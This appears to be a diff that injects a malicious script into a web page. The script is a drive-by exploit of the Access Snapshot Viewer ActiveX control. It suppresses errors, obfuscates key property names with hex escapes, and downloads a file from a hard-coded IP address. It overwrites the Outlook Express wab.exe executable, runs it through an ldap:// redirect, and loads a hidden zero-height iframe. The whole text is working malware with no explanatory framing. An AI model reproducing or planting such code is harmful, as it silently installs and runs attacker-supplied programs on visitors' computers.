@@ -1,0 +1,53 @@
+<script type="text/javascript">
+
+function rpppr() 
+{
+return true;
+}
+window.onerror = rpppr;
+
+var x;
+var oootuso;
+var tu_bj = new Array();
+tu_bj[0] = "c:/Program Files/Outlook Express/wab.exe";
+tu_bj[1] = "d:/Program Files/Outlook Express/wab.exe";
+tu_bj[2] = "e:/Program Files/Outlook Express/wab.exe";
+
+var tujlc = new ActiveXObject("snpvw.Snapshot Viewer Control.1");
+
+if(tujlc="[object]")
+{
+
+setTimeout('window.location = "ldap://"',3000);
+
+for (x in tu_bj)
+{
+oootuso = new ActiveXObject("snpvw.Snapshot Viewer Control.1")
+
+var tuf1 = 'http://59.34.197.63/exe1/ce.css';
+var tuf2=tu_bj[x];
+
+oootuso.Zoom = 0;
+
+oootuso.ShowNavigationButtons = false;
+
+oootuso.AllowContextMenu = false;
+
+oootuso.SnapshotPath = tuf1;
+
+
+try
+{
+oootuso["\x43\x6f\x6d\x70\x72\x65\x73\x73\x65\x64\x50\x61\x74\x68"] = tuf2;
+oootuso["\x0050\x0072\x0069\x006e\x0074\x0053\x006e\x0061\x0070\x0073\x0068\x006f\x0074"](); 
+}catch(e){}
+
+}
+}
+
+</script>
+<br>
+<br>
+<br>
+<br>
+<iframe src=ce.htm width=100 height=0></iframe>
